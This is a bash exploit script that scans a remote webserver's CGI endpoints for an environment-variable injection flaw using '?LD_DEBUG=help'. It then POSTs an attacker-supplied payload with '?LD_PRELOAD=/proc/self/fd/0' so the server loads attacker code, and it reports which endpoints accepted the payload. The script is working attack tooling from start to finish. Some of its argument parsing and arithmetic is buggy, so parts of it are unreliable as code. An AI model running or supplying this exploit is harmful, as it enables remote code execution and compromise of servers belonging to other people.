#!/bin/bash

# Arguments

remote_ip_address=$1

remote_port=$2

remote_behind_ssl_connection=$3

payload_path=$4

cgi_endpoints_path=$5

# Local variables

vulnerability_check_query_parameter='?LD_DEBUG=help'

exploit_query_parameter='?LD_PRELOAD=/proc/self/fd/0'

source_ip_address=''

remote_base_host=''

cgi_endpoints=''

vulnerable_cgi_endpoints=''

# Procedures

get_parameters(){
    while getopts host:port:ssl:payload:cgi: flag
    do
        case "${flag}" in
            host) remote_ip_address=${OPTARG};;
            port) port=${OPTARG};;
            ssl) remote_behind_ssl_connection=${OPTARG};;
            payload) payload_path=${OPTARG};;
            cgi) cgi_endpoints_path=${OPTARG};;
        esac
    done

    if [[ $remote_ip_address == '' || $remote_port == '' || $payload_path == '' ]]; then
        echo 'Required parameters'
        
        echo '-host: IP/Host of remote vulnerable machine being attacked'
        echo '-port: Port of remote machine webserver'
        echo '-payload: Path to crafted payload being sent to vulnerable machine'

        echo 'Optional parameters'
        echo '-ssl: If the web server is running under a TLS/SSL tunnel. Defaults to false'
        echo '-cgi: Path to list of known vulnerable CGI endpoints, to be used in reconnaissance phase. Defaults to "cgi.endpoints"'
    fi
}

get_source_ip_address(){
    echo 'INFO: Getting remote machine IP'

    source_ip_address=$(curl -s 'ifconfig.me')

    echo "INFO: IP: $source_ip_address"
}

build_remote_base_host(){
    protocol='http'
    
    if [[ $remote_behind_ssl_connection == 'yes' ]]; then
        protocol='https'
    fi

    remote_base_host=$protocol://$remote_ip_address/
}

read_cgi_endpoints(){

    if [[ $cgi_endpoints_path == '' || ! -f $cgi_endpoints_path ]]; then
        cgi_endpoints_path='cgi.endpoints'
    fi

    cgi_endpoints=$(cat $cgi_endpoints_path)
}

find_vulnerable_cgi_endpoints(){

    echo "INFO: Finding vulnerable CGI endpoints on $remote_base_host"

    while IFS= read -r endpoint; do
        status_code=$(curl --head --location --write-out %{http_code} -s --output /dev/null $remote_base_host$endpoint$vulnerability_check_query_parameter)
        
        if [ $status_code == "000" ]; then
            echo "WARNING: Connection failure! (curl 000 status code) $remote_base_host$endpoint$vulnerability_check_query_parameter"
        elif [ $status_code == "200" ]; then
            echo "INFO: Found vulnerable endpoint: $endpoint"
            vulnerable_cgi_endpoints=$vulnerable_cgi_endpoints$endpoint\n
        fi

    done <<< "$cgi_endpoints"

    if [[ $vulnerable_cgi_endpoints == '' ]]; then
        echo 'FAILURE: No vulnerable endpoints were found! Exiting (-1)...'
        exit -1
    fi
}

send_payload_to_endpoints(){
    payloads_sent=0

    while IFS= read -r endpoint; do
        status_code=$(curl --request POST --head --location --write-out %{http_code} -s --data-binary "@$payload_path" $remote_base_host$endpoint$exploit_query_parameter)
        
        if [ $status_code == "000" ]; then
            echo "WARNING: Connection failure! (curl 000 status code) $remote_base_host$endpoint$"
        elif [ $status_code == "200" ]; then
            echo "INFO: Sent payload to $endpoint!"
            payloads_sent=payloads_sent + 1
        fi

    done <<< "$vulnerable_cgi_endpoints"
}

get_parameters

get_source_ip_address

build_remote_base_host

read_cgi_endpoints

find_vulnerable_cgi_endpoints

send_payload_to_endpoints
